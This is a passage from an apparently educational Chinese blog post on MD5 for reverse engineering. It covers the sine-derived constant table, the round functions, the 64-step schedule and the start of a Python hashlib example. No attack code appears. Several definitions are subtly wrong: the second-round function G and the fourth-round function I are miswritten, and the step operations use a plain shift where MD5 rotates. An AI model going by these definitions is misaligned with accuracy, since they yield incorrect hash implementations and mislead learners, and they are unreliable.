number">0xfffa3942</span><span class="token punctuation">,</span> <span class="token number">0x8771f681</span><span class="token punctuation">,</span> <span class="token number">0x6d9d6122</span><span class="token punctuation">,</span> <span class="token number">0xfde5380c</span><span class="token punctuation">,</span> <span class="token number">0xa4beea44</span><span class="token punctuation">,</span> <span class="token number">0x4bdecfa9</span><span class="token punctuation">,</span> <span class="token number">0xf6bb4b60</span><span class="token punctuation">,</span> <span class="token number">0xbebfbc70</span><span class="token punctuation">,</span> <span class="token number">0x289b7ec6</span><span class="token punctuation">,</span> <span class="token number">0xeaa127fa</span><span class="token punctuation">,</span> <span class="token number">0xd4ef3085</span><span class="token punctuation">,</span> <span class="token number">0x04881d05</span><span class="token punctuation">,</span> <span class="token number">0xd9d4d039</span><span class="token punctuation">,</span> <span class="token number">0xe6db99e5</span><span class="token punctuation">,</span> <span class="token number">0x1fa27cf8</span><span class="token punctuation">,</span> <span class="token number">0xc4ac5665</span><span class="token punctuation">,</span> <span class="token number">0xf4292244</span><span class="token punctuation">,</span> <span class="token number">0x432aff97</span><span class="token punctuation">,</span> <span class="token number">0xab9423a7</span><span class="token punctuation">,</span> <span class="token number">0xfc93a039</span><span class="token punctuation">,</span> <span class="token number">0x655b59c3</span><span class="token punctuation">,</span> <span class="token number">0x8f0ccc92</span><span class="token punctuation">,</span> <span class="token number">0xffeff47d</span><span class="token punctuation">,</span> <span class="token number">0x85845dd1</span><span class="token punctuation">,</span> <span class="token number">0x6fa87e4f</span><span class="token punctuation">,</span> <span class="token number">0xfe2ce6e0</span><span class="token punctuation">,</span> <span class="token number">0xa3014314</span><span class="token punctuation">,</span> <span class="token number">0x4e0811a1</span><span class="token punctuation">,</span> <span class="token number">0xf7537e82</span><span class="token punctuation">,</span> <span class="token number">0xbd3af235</span><span class="token punctuation">,</span> <span class="token number">0x2ad7d2bb</span><span class="token punctuation">,</span> <span class="token number">0xeb86d391</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这些数值由 <code>2 ^ 32 * (abs(sin(i)))</code> 得出，<code>i</code> 的取值范围在 1 ~ 64 （<strong>这个表的存在是在 IDA 中确认 MD5 算法的关键</strong>）</p><p>接下来是 MD5 算法最核心的环节，在这里对每一组消息进行 4 轮、每轮 16 步，总计 64 步的处理</p><p>以下是每次操作中用到的四个非线性函数（每轮一个）:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 第一轮逻辑函数</span><span class="token function">F</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span> <span class="token operator">&amp;</span> z<span class="token punctuation">)</span><span class="token comment">// 第二轮逻辑函数</span><span class="token function">G</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>y <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// 第三轮逻辑函数</span><span class="token function">H</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">^</span> y <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token comment">// 第四轮逻辑函数</span><span class="token function">I</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token punctuation">(</span>x <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">~</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义：  </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">FF</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> Mj<span class="token punctuation">,</span> s<span class="token punctuation">,</span> ti<span class="token punctuation">)</span> 操作为 a <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token function">F</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token operator">+</span> Mj <span class="token operator">+</span> ti<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> Mj<span class="token punctuation">,</span> s<span class="token punctuation">,</span> ti<span class="token punctuation">)</span> 操作为 a <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token function">G</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token operator">+</span> Mj <span class="token operator">+</span> ti<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> Mj<span class="token punctuation">,</span> s<span class="token punctuation">,</span> ti<span class="token punctuation">)</span> 操作为 a <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token function">H</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token operator">+</span> Mj <span class="token operator">+</span> ti<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> Mj<span class="token punctuation">,</span> s<span class="token punctuation">,</span> ti<span class="token punctuation">)</span> 操作为 a <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token function">I</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token operator">+</span> Mj <span class="token operator">+</span> ti<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 4 轮、每轮 16 步，总计 64 步的处理过程是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 第一轮  </span><span class="token function">FF</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M0 <span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">,</span><span class="token number">0xd76aa478</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M1 <span class="token punctuation">,</span><span class="token number">12</span> <span class="token punctuation">,</span><span class="token number">0xe8c7b756</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M2 <span class="token punctuation">,</span><span class="token number">17</span> <span class="token punctuation">,</span><span class="token number">0x242070db</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M3 <span class="token punctuation">,</span><span class="token number">22</span> <span class="token punctuation">,</span><span class="token number">0xc1bdceee</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M4 <span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">,</span><span class="token number">0xf57c0faf</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M5 <span class="token punctuation">,</span><span class="token number">12</span> <span class="token punctuation">,</span><span class="token number">0x4787c62a</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M6 <span class="token punctuation">,</span><span class="token number">17</span> <span class="token punctuation">,</span><span class="token number">0xa8304613</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M7 <span class="token punctuation">,</span><span class="token number">22</span> <span class="token punctuation">,</span><span class="token number">0xfd469501</span><span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M8 <span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">,</span><span class="token number">0x698098d8</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M9 <span class="token punctuation">,</span><span class="token number">12</span> <span class="token punctuation">,</span><span class="token number">0x8b44f7af</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M10 <span class="token punctuation">,</span><span class="token number">17</span> <span class="token punctuation">,</span><span class="token number">0xffff5bb1</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M11 <span class="token punctuation">,</span><span class="token number">22</span> <span class="token punctuation">,</span><span class="token number">0x895cd7be</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M12 <span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">,</span><span class="token number">0x6b901122</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M13 <span class="token punctuation">,</span><span class="token number">12</span> <span class="token punctuation">,</span><span class="token number">0xfd987193</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M14 <span class="token punctuation">,</span><span class="token number">17</span> <span class="token punctuation">,</span><span class="token number">0xa679438e</span> <span class="token punctuation">)</span>  <span class="token function">FF</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M15 <span class="token punctuation">,</span><span class="token number">22</span> <span class="token punctuation">,</span><span class="token number">0x49b40821</span> <span class="token punctuation">)</span>  <span class="token comment">// 第二轮  </span><span class="token function">GG</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M1 <span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">,</span><span class="token number">0xf61e2562</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M6 <span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">,</span><span class="token number">0xc040b340</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M11 <span class="token punctuation">,</span><span class="token number">14</span> <span class="token punctuation">,</span><span class="token number">0x265e5a51</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M0 <span class="token punctuation">,</span><span class="token number">20</span> <span class="token punctuation">,</span><span class="token number">0xe9b6c7aa</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M5 <span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">,</span><span class="token number">0xd62f105d</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M10 <span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">,</span><span class="token number">0x02441453</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M15 <span class="token punctuation">,</span><span class="token number">14</span> <span class="token punctuation">,</span><span class="token number">0xd8a1e681</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M4 <span class="token punctuation">,</span><span class="token number">20</span> <span class="token punctuation">,</span><span class="token number">0xe7d3fbc8</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M9 <span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">,</span><span class="token number">0x21e1cde6</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M14 <span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">,</span><span class="token number">0xc33707d6</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M3 <span class="token punctuation">,</span><span class="token number">14</span> <span class="token punctuation">,</span><span class="token number">0xf4d50d87</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M8 <span class="token punctuation">,</span><span class="token number">20</span> <span class="token punctuation">,</span><span class="token number">0x455a14ed</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M13 <span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">,</span><span class="token number">0xa9e3e905</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M2 <span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">,</span><span class="token number">0xfcefa3f8</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M7 <span class="token punctuation">,</span><span class="token number">14</span> <span class="token punctuation">,</span><span class="token number">0x676f02d9</span> <span class="token punctuation">)</span>  <span class="token function">GG</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M12 <span class="token punctuation">,</span><span class="token number">20</span> <span class="token punctuation">,</span><span class="token number">0x8d2a4c8a</span> <span class="token punctuation">)</span>  <span class="token comment">// 第三轮  </span><span class="token function">HH</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M5 <span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">,</span><span class="token number">0xfffa3942</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M8 <span class="token punctuation">,</span><span class="token number">11</span> <span class="token punctuation">,</span><span class="token number">0x8771f681</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M11 <span class="token punctuation">,</span><span class="token number">16</span> <span class="token punctuation">,</span><span class="token number">0x6d9d6122</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M14 <span class="token punctuation">,</span><span class="token number">23</span> <span class="token punctuation">,</span><span class="token number">0xfde5380c</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M1 <span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">,</span><span class="token number">0xa4beea44</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M4 <span class="token punctuation">,</span><span class="token number">11</span> <span class="token punctuation">,</span><span class="token number">0x4bdecfa9</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M7 <span class="token punctuation">,</span><span class="token number">16</span> <span class="token punctuation">,</span><span class="token number">0xf6bb4b60</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M10 <span class="token punctuation">,</span><span class="token number">23</span> <span class="token punctuation">,</span><span class="token number">0xbebfbc70</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M13 <span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">,</span><span class="token number">0x289b7ec6</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M0 <span class="token punctuation">,</span><span class="token number">11</span> <span class="token punctuation">,</span><span class="token number">0xeaa127fa</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M3 <span class="token punctuation">,</span><span class="token number">16</span> <span class="token punctuation">,</span><span class="token number">0xd4ef3085</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M6 <span class="token punctuation">,</span><span class="token number">23</span> <span class="token punctuation">,</span><span class="token number">0x04881d05</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M9 <span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">,</span><span class="token number">0xd9d4d039</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M12 <span class="token punctuation">,</span><span class="token number">11</span> <span class="token punctuation">,</span><span class="token number">0xe6db99e5</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M15 <span class="token punctuation">,</span><span class="token number">16</span> <span class="token punctuation">,</span><span class="token number">0x1fa27cf8</span> <span class="token punctuation">)</span>  <span class="token function">HH</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M2 <span class="token punctuation">,</span><span class="token number">23</span> <span class="token punctuation">,</span><span class="token number">0xc4ac5665</span> <span class="token punctuation">)</span>  <span class="token comment">// 第四轮  </span><span class="token function">II</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M0 <span class="token punctuation">,</span><span class="token number">6</span> <span class="token punctuation">,</span><span class="token number">0xf4292244</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M7 <span class="token punctuation">,</span><span class="token number">10</span> <span class="token punctuation">,</span><span class="token number">0x432aff97</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M14 <span class="token punctuation">,</span><span class="token number">15</span> <span class="token punctuation">,</span><span class="token number">0xab9423a7</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M5 <span class="token punctuation">,</span><span class="token number">21</span> <span class="token punctuation">,</span><span class="token number">0xfc93a039</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M12 <span class="token punctuation">,</span><span class="token number">6</span> <span class="token punctuation">,</span><span class="token number">0x655b59c3</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M3 <span class="token punctuation">,</span><span class="token number">10</span> <span class="token punctuation">,</span><span class="token number">0x8f0ccc92</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M10 <span class="token punctuation">,</span><span class="token number">15</span> <span class="token punctuation">,</span><span class="token number">0xffeff47d</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M1 <span class="token punctuation">,</span><span class="token number">21</span> <span class="token punctuation">,</span><span class="token number">0x85845dd1</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M8 <span class="token punctuation">,</span><span class="token number">6</span> <span class="token punctuation">,</span><span class="token number">0x6fa87e4f</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M15 <span class="token punctuation">,</span><span class="token number">10</span> <span class="token punctuation">,</span><span class="token number">0xfe2ce6e0</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M6 <span class="token punctuation">,</span><span class="token number">15</span> <span class="token punctuation">,</span><span class="token number">0xa3014314</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M13 <span class="token punctuation">,</span><span class="token number">21</span> <span class="token punctuation">,</span><span class="token number">0x4e0811a1</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>M4 <span class="token punctuation">,</span><span class="token number">6</span> <span class="token punctuation">,</span><span class="token number">0xf7537e82</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>M11 <span class="token punctuation">,</span><span class="token number">10</span> <span class="token punctuation">,</span><span class="token number">0xbd3af235</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>b <span class="token punctuation">,</span>M2 <span class="token punctuation">,</span><span class="token number">15</span> <span class="token punctuation">,</span><span class="token number">0x2ad7d2bb</span> <span class="token punctuation">)</span>  <span class="token function">II</span><span class="token punctuation">(</span>b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d <span class="token punctuation">,</span>a <span class="token punctuation">,</span>M9 <span class="token punctuation">,</span><span class="token number">21</span> <span class="token punctuation">,</span><span class="token number">0xeb86d391</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>如果 128 位消息已经处理完，则从低地址开始用 16 进制逐个输出字节便得到 32 字符的 MD5 码，取正中间的 16 字符就是 16 字符的 MD5 码</li></ol><hr><h2 id="加密代码"><a href="#加密代码" class="headerlink" title="加密代码"></a>加密代码</h2><h3 id="Python-版"><a href="#Python-版" class="headerlink" title="Python 版"></a>Python 版</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibstring <span class="token operator">=</span> <span class="token string">'flag&#123;welcome_to_uf4te!&#125;'</span><span class="token keyword">def</span> <span class="token function">md5value</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    input_name <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    input_name<span class="token punctuation">.</span>update<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大写的32位 : "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>input_name<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大写的16位 : "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>input_name<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">8</span><span 